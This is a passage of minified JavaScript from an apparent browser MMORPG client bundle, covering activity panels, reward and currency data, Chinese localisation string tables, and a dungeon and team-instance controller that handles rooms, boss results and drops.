p,d=s.GlobalConfig.ActivityConfig[t],c=s.GlobalConfig["ActivityType"+e+"Config"]?s.GlobalConfig["ActivityType"+e+"Config"][t]:null,f=0;return c&&("ActivityType"+e+"Config"=="ActivityType57Config"?f=0:(null===c||void 0===c?void 0:c.showType)?f=null===c||void 0===c?void 0:c.showType:c[0]&&(null===(i=c[0])||void 0===i?void 0:i.showType)?f=null===(n=c[0])||void 0===n?void 0:n.showType:c[1]&&(null===(o=c[1])||void 0===o?void 0:o.showType)?f=c[1]&&(null===(a=c[1])||void 0===a?void 0:a.showType):c[1]&&c[1][1]&&(null===(r=c[1][1])||void 0===r?void 0:r.showType)&&(f=c[1]&&(null===(l=c[1][1])||void 0===l?void 0:l.showType))),p=f>0?ObjectPool.pop("OSATarget"+d.activityType+"Panel"+f):ObjectPool.pop("OSATarget"+d.activityType+"Panel"),p.activityID=t,d.pageSkin&&(p._sn_=d.pageSkin),p},e.prototype.updateData=function(){},e.getActivityTypeFromId=function(t){var e;return s.GlobalConfig.ActivityBtnConfig[t]&&(e=s.GlobalConfig.ActivityBtnConfig[t]),e?e.activityType:o.ActivityType.Normal},e.prototype.time1s=function(){var t=a.Activity.ins().getActivityDataById(this.activityID);t&&(this.sTime=t.getRemainTime())},e}(n.BaseView);e.ActivityPanel=r,window.ActivityPanel=r,__reflect(r.prototype,"ActivityPanel",[]),window.ActivityPanel=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RewardDataCurrency=e.RewardData=e.AD_REWARDTYPE=void 0;var n,o=i(0);!function(t){t[t.None=0]="None",t[t.OFFLine=1]="OFFLine",t[t.CALLBACK_SHOP=2]="CALLBACK_SHOP",t[t.BlackSmith=3]="BlackSmith",t[t.BAG=4]="BAG",t[t.FH=5]="FH",t[t.SIGNIN=6]="SIGNIN",t[t.GOLD=7]="GOLD",t[t.OFFLine_2=8]="OFFLine_2"}(n=e.AD_REWARDTYPE||(e.AD_REWARDTYPE={})),window.AD_REWARDTYPE=n;var s=function(){function t(){this.isRedPoint=0}return t.prototype.parser=function(t){this.type=t.readInt(),this.id=t.readInt(),this.count=t.readInt()},t.objectToRewardData=function(e){var i=new t;return i.id=e.id||0,i.type=e.type||0,i.count=e.count||0,i},t.objectsToRewardDatas=function(e){if(!e)return null;var i=[];for(var n in e)i.push(t.objectToRewardData(e[n]));return i},t.getCurrencyName=function(e){return t.CURRENCY_NAME[e]},t.getCurrencyRes=function(e){return t.CURRENCY_RES[e]},t.getRewardStr=function(e){return e?0==e.type?t.getCurrencyName(e.id)+"*"+e.count:o.GlobalConfig.ItemConfig[e.id].name+"*"+e.count:""},t.CURRENCY_NAME={},t.CURRENCY_RES={},t}();e.RewardData=s,window.RewardData=s,__reflect(s.prototype,"RewardData",[]);var a;!function(t){t[t.Exp=0]="Exp",t[t.Glod=1]="Glod",t[t.Yb=2]="Yb",t[t.Shengwang=3]="Shengwang",t[t.Lingpo=4]="Lingpo",t[t.GuildContribute=5]="GuildContribute",t[t.GuildGold=6]="GuildGold",t[t.Feats=7]="Feats",t[t.Recharge=99]="Recharge"}(a=e.RewardDataCurrency||(e.RewardDataCurrency={})),window.RewardDataCurrency=a,window.RewardData=s},function(t,e,i){"use strict";function n(){e.QUALITY_NAME=[gettext("普通"),gettext("优秀"),gettext("精良"),gettext("史诗"),gettext("传说"),gettext("远古"),gettext("神器")],e.SOUL_NAME=["",gettext("青龙"),gettext("白虎"),gettext("朱雀"),gettext("玄武"),gettext("黄龙"),gettext("鸾鸟")],a.CommonUtils.unitsStr=[gettext("万"),gettext("亿")],u.RewardData.CURRENCY_RES={1:"zjmjinbi",2:"szyuanbao",3:"ZSshengwang",4:"ZSlingpo",0:"result_json.ZSexp",5:"ZSguildgx",6:"ZSguildfund",8:"ZSchengjiu",99:"ZScoin",7:"ZShonor",10:c.ItemUtil.getItemSource(500008),9:c.ItemUtil.getItemSource(500007),11:"hejisuipian",12:"hejisuipian1",13:"ZSexp",14:"ZSprestige",15:"ZSchip",16:"SSExp",20:"kf_yunbiao_gricon",24:"skillpoint"},h.Role.jobNumberToName={0:gettext("通用"),1:gettext("战士"),2:gettext("法师"),3:gettext("道士"),4:gettext("刺客"),5:gettext("弓手")},p.GuildLanguage.guildOffice=[gettext("成员"),gettext("精英"),gettext("堂主"),gettext("护法"),gettext("长老"),gettext("副会长"),gettext("会长")],p.GuildLanguage.guildBuilding=["",gettext("管理大厅"),gettext("练功房")],s.ColorUtil.COLOR_STR=[gettext("白色"),gettext("绿色"),gettext("紫色"),gettext("橙色"),gettext("红色"),gettext("金色")],d.PeakedData.STATE_TYPE_CN=["","","",gettext("{0}进{1}强",16,8),gettext("{0}进{1}强",8,4),gettext("半决赛"),gettext("决赛"),""],d.PeakedData.STATE_TYPE_AWARD_CN=["","",gettext("参与奖"),gettext("{0}强",16),gettext("{0}强",8),gettext("{0}强",4),gettext("亚军"),gettext("冠军")],d.PeakedData.STATE_ICON_CN=["",gettext("报名"),gettext("淘汰赛"),gettext("{0}强赛",8),gettext("{0}强赛",4),gettext("半决赛"),gettext("决赛"),gettext("跨服赛")],d.PeakedData.STATE_KF_TYPE_CN=["","",gettext("{0}进{1}强",64,32),gettext("{0}进{1}强",32,16),gettext("{0}进{1}强",16,8),gettext("{0}进{1}强",8,4),gettext("半决赛"),gettext("决赛"),""],d.PeakedData.STATE_KF_TYPE_AWARD_CN=["",gettext("参与奖"),gettext("{0}强",64),gettext("{0}强",32),gettext("{0}强",16),gettext("{0}强",8),gettext("{0}强",4),gettext("亚军"),gettext("冠军")],d.PeakedData.STATE_KF_ICON_CN=[gettext("跨服赛"),gettext("淘汰赛"),gettext("{0}强赛",32),gettext("{0}强赛",16),gettext("{0}强赛",8),gettext("{0}强赛",4),gettext("半决赛"),gettext("决赛")],d.PeakedData.SERV_CN=[gettext("本服赛"),gettext("跨服赛")],l.StringUtils.chnNumChar=[gettext("零"),gettext("一"),gettext("二"),gettext("三"),gettext("四"),gettext("五"),gettext("六"),gettext("七"),gettext("八"),gettext("九")],l.StringUtils.chnUnitSection=["",gettext("万"),gettext("亿"),gettext("万亿"),gettext("亿亿")],l.StringUtils.chnUnitChar=["",gettext("十"),gettext("百"),gettext("千")],u.RewardData.CURRENCY_NAME={0:gettext("经验"),1:gettext("金币"),2:gettext("元宝"),3:gettext("声望"),4:gettext("魂石"),5:gettext("公会贡献"),6:gettext("公会资金"),7:gettext("功勋"),8:gettext("成就"),9:gettext("战纹精华"),10:gettext("战纹碎片"),11:gettext("低级符文碎片"),12:gettext("高级符文碎片"),13:gettext("神兵经验"),14:gettext("威望"),15:gettext("筹码"),16:gettext("兽神精魄"),20:gettext("个人积分"),21:gettext("公会积分"),99:gettext("元宝")},h.Role.typeNumberToName=[gettext("武器"),gettext("头盔"),gettext("衣服"),gettext("项链"),gettext("护腕"),gettext("腰带"),gettext("戒指"),gettext("鞋子"),gettext("护腕2"),gettext("戒指2"),gettext("护肩"),gettext("面甲"),gettext("披风"),gettext("盾牌"),gettext("特戒"),gettext("特戒"),gettext("特戒"),gettext("特戒"),gettext("勋章"),gettext("玉佩"),gettext("神盾"),gettext("秘录"),gettext("子鼠"),gettext("丑牛"),gettext("寅虎"),gettext("卯兔"),gettext("辰龙"),gettext("巳蛇"),gettext("午马"),gettext("未羊"),gettext("申猴"),gettext("酉鸡"),gettext("戌狗"),gettext("亥猪"),gettext("符咒"),gettext("号角")],r.DateUtils.FORMAT_1=[gettext("秒"),gettext("分"),gettext("时"),gettext("天"),gettext("月"),gettext("年")],r.DateUtils.WEEK_CN=[gettext("日"),gettext("一"),gettext("二"),gettext("三"),gettext("四"),gettext("五"),gettext("六")],r.DateUtils.WEEK_CN2=[gettext("周日"),gettext("周一"),gettext("周二"),gettext("周三"),gettext("周四"),gettext("周五"),gettext("周六")],r.DateUtils.MONTH_CN=[gettext("0月"),gettext("1月"),gettext("2月"),gettext("3月"),gettext("4月"),gettext("5月"),gettext("6月"),gettext("7月"),gettext("8月"),gettext("9月"),gettext("10月"),gettext("11月"),gettext("12月")],r.DateUtils.DAY_CN=[gettext("0日"),gettext("1日"),gettext("2日"),gettext("3日"),gettext("4日"),gettext("5日"),gettext("6日"),gettext("7日"),gettext("8日"),gettext("9日"),gettext("10日"),gettext("11日"),gettext("12日"),gettext("13日"),gettext("14日"),gettext("15日"),gettext("16日"),gettext("17日"),gettext("18日"),gettext("19日"),gettext("20日"),gettext("21日"),gettext("22日"),gettext("23日"),gettext("24日"),gettext("25日"),gettext("26日"),gettext("27日"),gettext("28日"),gettext("29日"),gettext("30日"),gettext("31日")]}Object.defineProperty(e,"__esModule",{value:!0}),e.ITEM_NUMTYPE=e.ITEM_NAME=e.ITEM_ICON=e.initGlobleTxt=e.ITEM_TYPE=e.SOUL_NAME=e.QUALITY_NAME=e.QUALITY_COLOR=e.additionRange=e.FitleStyle=e.DepotType=void 0;var o,s=i(18),a=i(24),r=i(8),l=i(42),h=i(48),u=i(30),p=i(106),d=i(89),c=i(10);!function(t){t[t.Equip=0]="Equip",t[t.Rune=1]="Rune",t[t.Heirloom=2]="Heirloom",t[t.Beast=3]="Beast"}(o=e.DepotType||(e.DepotType={})),window.DepotType=o;var f;!function(t){t[t.fj=1]="fj",t[t.hc=2]="hc"}(f=e.FitleStyle||(e.FitleStyle={})),window.FitleStyle=f,e.additionRange=15,e.QUALITY_COLOR=[15329769,4587386,3005183,15939071,16733184,16711680,16757760,52479],e.QUALITY_NAME=[],e.SOUL_NAME=[],e.ITEM_TYPE=["","gold","yuanbao"],e.initGlobleTxt=n,window.initGlobleTxt=n,e.ITEM_ICON={gold:"zjmjinbi",yuanbao:"szyuanbao"},e.ITEM_NAME={0:gettext("经验"),1:gettext("金币"),2:gettext("元宝"),3:gettext("声望"),4:gettext("魂石"),5:gettext("公会贡献"),6:gettext("公会资金"),7:gettext("功勋"),8:gettext("成就"),9:gettext("战纹精华"),10:gettext("战纹碎片"),11:gettext("低级符文碎片"),12:gettext("高级符文碎片"),13:gettext("神兵经验"),14:gettext("威望"),15:gettext("筹码"),16:gettext("兽神精魄"),20:gettext("个人积分"),21:gettext("公会积分"),99:gettext("元宝")};var g;!function(t){t[t.Exp=0]="Exp",t[t.Glod=1]="Glod",t[t.Yb=2]="Yb",t[t.Shengwang=3]="Shengwang",t[t.Lingpo=4]="Lingpo",t[t.GuildContribute=5]="GuildContribute",t[t.GuildGold=6]="GuildGold",t[t.Feats=7]="Feats",t[t.Recharge=99]="Recharge"}(g=e.ITEM_NUMTYPE||(e.ITEM_NUMTYPE={})),window.ITEM_NUMTYPE=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FbCT=void 0;var n=i(210),o=i(8),s=i(34),a=i(14),r=i(37),l=i(145),h=i(0),u=i(4),p=i(13),d=i(20),c=i(30),f=i(40),g=i(10),m=i(58),v=i(45),y=i(297),C=i(53),T=i(236),b=i(23),w=i(137),I=i(59),_=i(51),S=i(338),x=i(131),D=i(7),A=i(47),k=i(169),B=i(2),P=i(237),R=i(26),E=function(t){function e(){var e=t.call(this)||this;return e._groupID=1,e._guanqiaID=-1,e.rewards=[],e.eliteRewards=[],e.currentEnergy=0,e.encounterPos=[],e.expMonterCount=0,e.expMonterCountKill=0,e.isQuite=!0,e.tfRoomID=0,e.tfTeamID=0,e.tfPassID=0,e.exTfPassID=0,e._tfInviteTime=0,e.isNormal=!0,e.tfPurgatoryRoomID=0,e.tfPurgatoryTeamID=0,e.tfPurgatoryPassID=0,e.exPurgatoryTfPassID=0,e._tfPurgatoryInviteTime=0,e.fbRings={buyTime:0,challengeTime:0,canTakeAwardId:0},e.guanqiaMonster=[],e.fbConfig={},e.fbFirstLogs={},e.oldFbType=0,e.pkGqboss=!1,e.initPos=!0,e.sysId=PackageID.Guanqia,e.regNetMsg(4,e.doRoleAllDie),e.regNetMsg(13,e.postFbTime),e.regNetMsg(3,e.doBossResult),e.regNetMsg(12,e.doOfflineReward),e.regNetMsg(30,e.postCreateTFRoomSuccess),e.regNetMsg(31,e.postEnterTFRoomSuccess),e.regNetMsg(32,e.exitTFRoom),e.regNetMsg(33,e.postFTRoomChange),e.regNetMsg(34,e.postFTRoomPassInfo),e.regNetMsg(35,e.doTeamFuBenEnd),e.regNetMsg(37,e.postTeamFuBenRank),e.regNetMsg(39,e.teamFbSysInviteInfo),e.regNetMsg(43,e.postFbChat),e.regNetMsg(46,e.monsterDrop),e.regNetMsg(47,e.postFbLog),e.regNetMsg(83,e.fightTime),e.regNetMsg(84,e.postCreatePurgatoryTFRoomSuccess),e.regNetMsg(85,e.postEnterPurgatoryTFRoomSuccess),e.regNetMsg(86,e.exitPurgatoryTFRoom),e.regNetMsg(87,e.postPurgatoryFTRoomChange),e.regNetMsg(88,e.postPurgatoryFTRoomPassInfo),e.regNetMsg(89,e.doPurgatoryTeamFuBenEnd),e.regNetMsg(91,e.postPurgatoryTeamFuBenRank),e.regNetMsg(93,e.teamPurgatoryFbSysInviteInfo),observe(e,e.onChangeScene,Ts.enterScene.enterOK),observe(e,e.recordKill,Ts.entityHpChange),observe(e,e.postAddEnergy,b.GameLogic.ins().postExpMc),e}return __extends(e,t),Object.defineProperty(e.prototype,"rCount",{get:function(){return this.fbConfig.rCount||0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"goldEff",{get:function(){return this.fbConfig.goldEff||0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"expEff",{get:function(){return this.fbConfig.expEff||0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"zyPos",{get:function(){return this.fbConfig.zyPos},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"energy",{get:function(){return this.fbConfig.energy||0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"waveEnergy",{get:function(){return this.fbConfig.waveEnergy||0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"waveMonsterCount",{get:function(){return this.fbConfig.waveMonsterCount||0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"waveMonsterId",{get:function(){return this.fbConfig.waveMonsterId||[]},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"outPos",{get:function(){return this.fbConfig.outPos||{x:0,y:0,a:0}},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"rPos",{get:function(){return this.fbConfig.rPos||[]},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"eliteMonsterId",{get:function(){return this.fbConfig.eliteMonsterId||0},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"wanderpercent",{get:function(){return void 0==this.fbConfig.wanderpercent?5e3:this.fbConfig.wanderpercent},enumerable:!1,configurable:!0}),e.prototype.postTeamFuBenRank=function(t){this.tfPassRanks=[];for(var e,i,n=t.readByte(),o=0;n>o;o++){e={configID:t.readInt(),members:[]},i=t.readByte();for(var s=0;i>s;s++)e.members.push({position:t.readByte(),roleName:t.readString()});this.tfPassRanks.push(e)}},e.prototype.recordKill=function(t){var e=t.hp;0>=e&&(this.expMonterCountKill+=1)},e.prototype.initLogin=function(){},e.ins=function(){return t.ins.call(this)},e.prototype.onChangeScene=function(){this.rewards=[],this.eliteRewards=[],this.expMonterCountKill=0,this.expMonterCount=0,this.chatCampDtList||(this.chatCampDtList=new eui.ArrayCollection),this.chatCampDtList.removeAll();var t=h.GlobalConfig.InstanceConfig[d.GameMap.fubenID],i=h.GlobalConfig.InstanceConfig[d.GameMap.fubenID].name;t.maptips&&B.TipsCT.ins().showTips(t.maptips);var n=win.get("TeamFbRoomWin");!n||n.getConfigFbId()!=d.GameMap.fubenID&&k.RexueDideCT.ins().isOpenAutoFight||win.close("TeamFbRoomWin"),win.get("MainCityWin")&&win.close("MainCityWin"),win.get("TeamFbResultWin")&&win.close("TeamFbResultWin"),win.get("InvadeTeamRoomWin")&&win.close("InvadeTeamRoomWin"),d.GameMap.fbType,this.oldFbType!=d.GameMap.fbType&&this.oldFbType==e.FB_PVP&&3==this.curFbID?x.Ladder.ins().challgeNum&&win.open("LadderInfoPanel"):this.oldFbType==e.FB_TYPE_CROSSDART&&d.GameMap.fbType!=e.FB_TYPE_CROSSDART?this.openCrossDartCarMapWin():this.oldFbType==e.FB_TYPE_SOULS&&d.GameMap.fbType!=e.FB_TYPE_SOULS?win.open("GuildSoulsLandPanel"):this.oldFbType==e.FB_TYPE_HEGEMONY&&d.GameMap.fbType!=e.FB_TYPE_HEGEMONY?this.openHegemonyWin():this.oldFbType==e.FB_TYPE_LINGJING&&d.GameMap.fbType!=e.FB_TYPE_LINGJING&&win.open("LingJingMainPanel"),this.oldFbType=d.GameMap.fbType},e.prototype.autoPk=function(){d.GameMap.sceneInMain()&&p.SubRoles.lookAtTar&&(this.postPlayWarm(1),this.sendPKBoss(),this.pkGqboss=!0)},e.prototype.postAddEnergy=function(){this.currentEnergy+=Math.ceil(this.waveEnergy/this.waveMonsterCount),this.currentEnergy>this.energy&&(this.currentEnergy=this.energy)},e.prototype.postPlayWarm=function(t){return t},e.prototype.doRoleAllDie=function(t){n.ResultManager.ins().create(d.GameMap.fbType,0)},e.prototype.postFbTime=function(t){return this.curFbID=t.readInt(),this.curFbLeftTime=t.readInt(),d.GameMap.checkIsInGuildBattle()&&(this.curFbLeftTime=_.GuildBattleCT.ins().getModel().actLeftTime),[this.curFbID,this.curFbLeftTime]},Object.defineProperty(e.prototype,"guanqiaID",{get:function(){return this._guanqiaID},set:function(t){if(this._guanqiaID!=t){this._guanqiaID=t,this.bossIsChallenged=!1;for(var e in h.GlobalConfig.WorldRewardConfig)if(this._guanqiaID<=h.GlobalConfig.WorldRewardConfig[e].needLevel){this._groupID=h.GlobalConfig.WorldRewardConfig[e].groupId;break}}this.encounterPos=[];for(var i in this.zyPos)this.encounterPos.push(parseInt(i))},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"groupID",{get:function(){return this._groupID},enumerable:!1,configurable:!0}),e.prototype.sendPKBoss=function(){var t=this,e=this.getBytes(2),i=p.SubRoles.lookAtTar;Timer.start(500,1,function(){e.writeInt(Math.floor(i.x)),e.writeInt(Math.floor(i.y)),t.sendToServer(e)},this)},e.prototype.tempFunc=function(){var t=p.SubRoles.lookAtTar;if(!t)return void Timer.stop(this.tempFunc,this);var e=Math.floor(t.x/d.GameMap.CELL_SIZE),i=Math.floor(t.y/d.GameMap.CELL_SIZE),n=this.outPos.x,o=this.outPos.y;e==n&&i==o&&(Timer.stop(this.tempFunc,this),b.GameLogic.ins().removeOutEff(),this.initPos=!1,this.pkGqboss=!1,send(Ts.exitFB))},e.prototype.doOfflineReward=function(t){var e=[];e[0]=t.readInt(),e[1]=t.readInt(),e[2]=t.readInt(),e[3]=t.readInt(),e[4]=t.readInt();for(var i=t.readInt(),n=[],o=0;i>o;o++){var s={};s.type=t.readInt(),s.exp=t.readInt(),s.gold=t.readInt(),n.push(s)}e[5]=n,i=t.readByte();for(var a=[],o=0;i>o;o++){var r={};r.id=t.readByte(),r.count=t.readInt(),a.push(r)}win.open("OfflineRewardWin",e,a)},e.prototype.postExpFly=function(t,e,i){return void 0===e&&(e=1),void 0===i&&(i=10),[t,e,i]},e.prototype.checkInFB=function(){return!1},e.prototype.createMonster=function(t){var i=this.guanqiaMonster[t],n=e.createModel(i);return n.name=i.name,n._avatar=+i.avatar,n._scale=i.scale,n.wanderrange=i.wanderrange,n.wandertime=i.wandertime,n.effect=i.effect,n._dirNum=i.dirNum,n},e.createModel=function(t){var e=new l.EntityModel;return e.type=EntityType.Monster,e.configID=t.id,e.setAtt(s.AttributeType.atHp,t.hp),e.setAtt(s.AttributeType.atMaxHp,t.hp),e.setAtt(s.AttributeType.atAttack,t.atk),e.setAtt(s.AttributeType.atDef,t.def),e.setAtt(s.AttributeType.atRes,t.res),e.setAtt(s.AttributeType.atCrit,0),e.setAtt(s.AttributeType.atTough,0),e.setAtt(s.AttributeType.atMoveSpeed,1e3),e.setAtt(s.AttributeType.atAttackSpeed,1e3),e.setAtt(s.AttributeType.atPenetrate,t.penetRate||0),e},e.getPersonalBossFbIds=function(){var t=[];for(var e in h.GlobalConfig.DailyFubenConfig){var i=h.GlobalConfig.DailyFubenConfig[e];i&&i.bossId&&t.push(i)}return t.sort(function(t,e){return t.sort<e.sort?-1:1}),t},e.prototype.sendCreateTFRoom=function(){var t=this.getBytes(30);this.sendToServer(t)},e.prototype.postCreateTFRoomSuccess=function(t){this.tfRoomID=t.readInt(),this.tfTeamID=t.readInt(),!this.tfRoomID||d.GameMap.fbType!=e.FB_TYPE_GUANQIABOSS&&d.GameMap.fbType!=e.FB_TYPE_CITY||win.open("TeamFbRoomWin",1,this.tfTeamID,this.tfRoomID)},e.prototype.sendEnterTFRoom=function(t){if(d.GameMap.fbType==e.FB_TEAM)return void B.TipsCT.ins().showTips(gettext("当前已在组队副本,无法进入其他房间"));var i=this.getBytes(31);i.writeInt(t),this.sendToServer(i)},e.prototype.postEnterTFRoomSuccess=function(t){switch(t.readByte()){case 0:this.tfTeamID=t.readInt(),this.tfRoomID=t.readInt(),win.open("TeamFbRoomWin",1,this.tfTeamID,this.tfRoomID);break;case 1:B.TipsCT.ins().showTips(gettext("每周{0}{1}后不能挑战",o.DateUtils.WEEK_CN[h.GlobalConfig.TeamFuBenBaseConfig.closeTime[0]],h.GlobalConfig.TeamFuBenBaseConfig.closeTime[1]));break;case 2:B.TipsCT.ins().showTips(gettext("在副本内不能进入"));break;case 3:B.TipsCT.ins().showTips(gettext("已经在别的房间"));break;case 4:B.TipsCT.ins().showTips(gettext("要进入的房间不存在"));break;case 5:B.TipsCT.ins().showTips(gettext("当前通关的层级不够"));break;case 6:B.TipsCT.ins().showTips(gettext("配置错误,不存在该房间配置"));break;case 7:B.TipsCT.ins().showTips(gettext("房间已经满人"));break;case 8:B.TipsCT.ins().showTips(gettext("等级不足")),I.GameFlashSaleCt.ins().reportLvNot()}},e.prototype.sendExitTFRoom=function(){this.sendBaseProto(32)},e.prototype.exitTFRoom=function(t){switch(t.readByte()){case 1:break;case 2:B.TipsCT.ins().showTips(gettext("您被队长踢出房间"));break;case 3:B.TipsCT.ins().showTips(gettext("队长解散了房间"))}win.close("TeamFbRoomWin"),this.tfRoomID=0,this.tfTeamID=0},e.prototype.sendBeginTF=function(){this.sendBaseProto(33)},e.prototype.postFTRoomChange=function(t){this.tfRoomID=t.readInt();var e=t.readByte();this.tfMembers||(this.tfMembers=[]),this.tfMembers.length=e,this.isTFCaptain=!1,this.isNormal=!0;for(var i,n=0;e>n;n++)i=this.tfMembers[n],i||(i=new T.TeamFuBenRoleVo,this.tfMembers[n]=i),i.parse(t),i.roleID==u.ActorCC.actorID&&1==i.position&&(this.isTFCaptain=!0)},e.prototype.sendOutTFRoom=function(t){var e=this.getBytes(34);e.writeInt(t),this.sendToServer(e)},e.prototype.sendExitTFFb=function(t){var e=this.getBytes(35);e.writeByte(t),this.sendToServer(e)},e.prototype.postFTRoomPassInfo=function(t){this.tfPassID=t.readInt(),this._tfInviteTime=t.readInt(),this.exTfPassID=t.readInt(),this.postFBInfoUpdate()},e.prototype.postFBInfoUpdate=function(){},e.prototype.getTfInviteCD=function(){return e.ins().isNormal?Math.floor((o.DateUtils.formatMiniDateTime(this._tfInviteTime)-D.GameServerCC.serverTime)/1e3):Math.floor((o.DateUtils.formatMiniDateTime(this._tfPurgatoryInviteTime)-D.GameServerCC.serverTime)/1e3)
},e.prototype.isTeamFBOpen=function(t){void 0===t&&(t=!1);var e=h.GlobalConfig.TeamFuBenBaseConfig;return D.GameServerCC.serverOpenDay+1<e.openDay||R.ZsCT.ins().stage<e.needZsLv?(t&&B.TipsCT.ins().showTips(gettext("开服第{0}天并达到{1}转开启",e.openDay,e.needZsLv)),!1):!0},e.prototype.doTeamFuBenEnd=function(t){var e=t.readInt(),i=t.readByte(),n=t.readByte(),o=[];o.length=n;for(var s,a=0;n>a;a++)s=new T.TeamFuBenRoleVo,o[a]=s,s.roleID=t.readInt(),s.position=t.readByte(),s.roleName=t.readString(),s.job=t.readByte(),s.sex=t.readByte(),s.isSignal=t.readByte();win.open("TeamFbResultWin",e,i,o)},e.prototype.sendTFRank=function(){this.sendBaseProto(36)},e.prototype.doBossResult=function(t){for(var i=this,o=t.readBoolean(),s=t.readShort(),a=t.readShort(),l=[],u=0;a>u;u++){var m=new c.RewardData;m.parser(t),l.push(m)}if(o){for(var v=p.SubRoles.ins().subRolesLen,y=void 0,C=0;v>C;C++)y=r.EntityManager.ins().getMainRole(C),y&&y.resetStand();for(var T=0;T<l.length;T++){var m=l[T];if(0==m.type&&1!=m.id&&2!=m.id||w.DropHelp.addDrop([0!=w.DropHelp.tempDropPoint.x?w.DropHelp.tempDropPoint.x:Math.floor(p.SubRoles.lookAtTar.x/d.GameMap.CELL_SIZE),0!=w.DropHelp.tempDropPoint.y?w.DropHelp.tempDropPoint.y:Math.floor(p.SubRoles.lookAtTar.y/d.GameMap.CELL_SIZE),m]),1==m.type){var I=h.GlobalConfig.ItemConfig[m.id],_=g.ItemUtil.getType(I);if(7==_){var x=new f.ItemData;x.configID=m.id,B.TipsCT.ins().showGoodEquipTips(x)}}}var D=function(){var t=null;if(s!=e.FB_TYPE_GUANQIABOSS)l.length?Timer.start(800,1,function(){n.ResultManager.ins().create(s,1,l,gettext("获得奖励如下："),t)},i):(i.pkGqboss=!1,send(Ts.exitFB));else if(i.outPos.x&&i.outPos.y){var o=i.outPos.x*d.GameMap.CELL_SIZE,a=i.outPos.y*d.GameMap.CELL_SIZE;i.outPos.hasOwnProperty("a")&&1==i.outPos.a&&b.GameLogic.ins().addOutEff(o,a,i.outPos.x,i.outPos.y);for(var h=p.SubRoles.ins().subRolesLen,u=0;h>u;u++){var c=r.EntityManager.ins().getMainRole(u);c&&d.GameMap.moveEntity(c,o,a)}Timer.start(1e3,0,i.tempFunc,i)}else i.initPos=!0,i.pkGqboss=!1,d.GameMap.fbType==s&&send(Ts.exitFB)};w.DropHelp.addCompleteFunc(D,this),w.DropHelp.start()}else this.pkGqboss=!1,n.ResultManager.ins().create(s,0);d.GameMap.fbType==e.FB_TYPE_GUANQIABOSS&&S.Hint.ins().postKillBossEx(this.guanqiaID)},e.prototype.sendTfSysInvite=function(t){var e=this.getBytes(38);e.writeString(t),this.sendToServer(e)},e.prototype.teamFbSysInviteInfo=function(t){var e=t.readString(),i=t.readString(),n=m.LangUtils.analysis(e,i);v.ChatCT.ins().createNewChatMsg(n,0,e,!0)},e.prototype.sendCreatePurgatoryTFRoom=function(){var t=this.getBytes(84);this.sendToServer(t)},e.prototype.postCreatePurgatoryTFRoomSuccess=function(t){this.tfPurgatoryRoomID=t.readInt(),this.tfPurgatoryTeamID=t.readInt(),this.isNormal=!1,this.tfPurgatoryRoomID&&(d.GameMap.fbType==e.FB_TYPE_GUANQIABOSS||e.FB_TYPE_CITY)&&win.open("TeamFbRoomWin",1,this.tfPurgatoryTeamID,this.tfPurgatoryRoomID)},e.prototype.sendEnterPurgatoryTFRoom=function(t){if(d.GameMap.fbType==e.FB_TEAM)return void B.TipsCT.ins().showTips(gettext("当前已在组队副本,无法进入其他房间"));var i=this.getBytes(85);i.writeInt(t),this.sendToServer(i)},e.prototype.postEnterPurgatoryTFRoomSuccess=function(t){switch(t.readByte()){case 0:e.ins().isNormal=!1,this.tfPurgatoryTeamID=t.readInt(),this.tfPurgatoryRoomID=t.readInt(),win.open("TeamFbRoomWin",1,this.tfPurgatoryTeamID,this.tfPurgatoryRoomID);break;case 1:B.TipsCT.ins().showTips(gettext("每周{0}{1}后不能挑战",o.DateUtils.WEEK_CN[h.GlobalConfig.TeamFuBenBaseConfig.closeTime[0]],h.GlobalConfig.TeamFuBenBaseConfig.closeTime[1]));break;case 2:B.TipsCT.ins().showTips(gettext("在副本内不能进入"));break;case 3:B.TipsCT.ins().showTips(gettext("已经在别的房间"));break;case 4:B.TipsCT.ins().showTips(gettext("要进入的房间不存在"));break;case 5:B.TipsCT.ins().showTips(gettext("当前通关的层级不够"));break;case 6:B.TipsCT.ins().showTips(gettext("配置错误,不存在该房间配置"));break;case 7:B.TipsCT.ins().showTips(gettext("房间已经满人"));break;case 8:B.TipsCT.ins().showTips(gettext("等级不足"))}},e.prototype.sendExitPurgatoryTFRoom=function(){this.sendBaseProto(86)},e.prototype.exitPurgatoryTFRoom=function(t){switch(t.readByte()){case 1:break;case 2:B.TipsCT.ins().showTips(gettext("您被队长踢出房间"));break;case 3:B.TipsCT.ins().showTips(gettext("队长解散了房间"))}win.close("TeamFbRoomWin"),this.tfPurgatoryRoomID=0,this.tfPurgatoryTeamID=0,e.ins().isNormal=!0},e.prototype.sendBeginPurgatoryTF=function(){this.sendBaseProto(87)},e.prototype.postPurgatoryFTRoomChange=function(t){this.tfPurgatoryRoomID=t.readInt();var e=t.readByte();this.tfPurgatoryMembers||(this.tfPurgatoryMembers=[]),this.tfPurgatoryMembers.length=e,this.isPurgatoryTFCaptain=!1;for(var i,n=0;e>n;n++)i=this.tfPurgatoryMembers[n],i||(i=new T.TeamFuBenRoleVo,this.tfPurgatoryMembers[n]=i),i.parse(t),i.roleID==u.ActorCC.actorID&&1==i.position&&(this.isPurgatoryTFCaptain=!0);this.isNormal=!1},e.prototype.sendOutPurgatoryTFRoom=function(t){var e=this.getBytes(88);e.writeInt(t),this.sendToServer(e)},e.prototype.postPurgatoryFTRoomPassInfo=function(t){this.tfPurgatoryPassID=t.readInt(),this._tfPurgatoryInviteTime=t.readInt(),this.exPurgatoryTfPassID=t.readInt(),this.postFBInfoUpdate()},e.prototype.sendExitPurgatoryTFFb=function(t){var e=this.getBytes(89);e.writeByte(t),this.sendToServer(e)},e.prototype.doPurgatoryTeamFuBenEnd=function(t){var 